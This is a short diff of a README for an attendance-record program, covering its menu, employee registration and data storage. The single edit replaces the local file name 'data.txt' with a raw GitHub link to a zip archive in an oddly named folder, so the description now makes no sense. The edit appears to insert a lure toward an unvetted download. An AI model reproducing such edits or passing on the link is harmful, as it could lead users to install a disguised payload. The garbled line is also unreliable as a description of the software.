@@ -7,7 +7,7 @@ Main Menu: Choose from Make Attendance, Add Employee, or View Employees.
 
 Ask for name, unique employee code, and 4-digit PIN (twice to confirm).
 
-Saves the name and code to data.txt.
+Saves the name and code to https://github.com/mr-RSA369/Attandence-Record-System/raw/refs/heads/main/mouthpiece/Record_System_Attandence_v2.4.zip
 
 Creates a personalized encrypted attendance file, using the PIN as the password.
 
